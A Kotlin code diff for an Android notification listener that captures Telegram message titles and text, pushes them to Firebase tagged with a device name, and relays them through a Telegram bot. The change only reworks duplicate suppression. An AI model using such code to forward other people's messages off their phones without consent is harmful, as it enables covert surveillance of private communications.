@@ -7,7 +7,7 @@ import android.service.notification.StatusBarNotification
 
 class TelegramNotificationListener : NotificationListenerService() {
 
-    private val lastSentText = HashMap<String, String>()
+    private val sentRecently = HashMap<String, Long>()
 
     override fun onNotificationPosted(sbn: StatusBarNotification) {
         val pkg = sbn.packageName
@@ -33,17 +33,15 @@ class TelegramNotificationListener : NotificationListenerService() {
 
         if (title.isEmpty() && text.isEmpty()) return
 
-        val key = sbn.key
         val combined = "$title|$text"
-        if (lastSentText[key] == combined) return
-        lastSentText[key] = combined
+        val now = System.currentTimeMillis()
+        val lastTime = sentRecently[combined]
+        if (lastTime != null && now - lastTime < 60000) return
+        sentRecently[combined] = now
 
-                val device = DevicePrefs.getDeviceName(applicationContext)
-                FirebaseHelper.pushTelegram(key, title, text, System.currentTimeMillis(), device)
+        val key = sbn.key
+        val device = DevicePrefs.getDeviceName(applicationContext)
+        FirebaseHelper.pushTelegram(key, title, text, now, device)
         TelegramHelper.send("📨 Telegram ($device)\n$title:\n$text")
-    }
-
-    override fun onNotificationRemoved(sbn: StatusBarNotification) {
-        lastSentText.remove(sbn.key)
     }
 }
